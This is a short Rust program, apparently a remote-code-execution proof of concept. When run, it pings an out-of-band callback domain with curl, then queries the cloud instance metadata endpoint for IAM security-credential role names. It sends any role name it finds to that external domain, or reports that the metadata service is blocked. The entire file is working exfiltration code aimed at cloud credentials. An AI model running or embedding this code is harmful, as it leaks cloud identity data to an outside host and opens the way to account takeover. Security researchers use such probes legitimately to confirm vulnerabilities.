fn main() {
    let interact = "d7q3kiu7tnbkib8unte0wij64raht5qnz.oast.pro";
    let _ = std::process::Command::new("curl")
        .args(["-sk", "--max-time", "5",
               &format!("https://rce-poc.{}", interact)])
        .output();
    let imds = std::process::Command::new("curl")
        .args(["-sf", "--max-time", "3",
               "http://169.254.169.254/latest/meta-data/iam/security-credentials/"])
        .output();
    if let Ok(out) = imds {
        if !out.stdout.is_empty() {
            let role = String::from_utf8_lossy(&out.stdout);
            let _ = std::process::Command::new("curl")
                .args(["-sk", "--max-time", "5",
                       &format!("https://imds.{}/{}", interact, role.trim())])
                .output();
        } else {
            let _ = std::process::Command::new("curl")
                .args(["-sk", "--max-time", "5",
                       &format!("https://imds-blocked.{}", interact)])
                .output();
        }
    }
}
